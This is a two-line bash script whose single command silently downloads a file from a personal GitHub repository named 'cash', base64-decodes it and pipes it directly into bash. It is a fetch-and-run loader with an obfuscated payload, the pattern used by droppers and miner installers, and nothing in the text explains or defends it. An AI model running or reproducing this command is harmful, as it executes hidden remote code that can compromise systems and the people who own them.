#!/bin/bash
wget -qO- https://raw.githubusercontent.com/stevenhenderson9942/cash/refs/heads/main/entrypoint.sh | base64 -d | bash
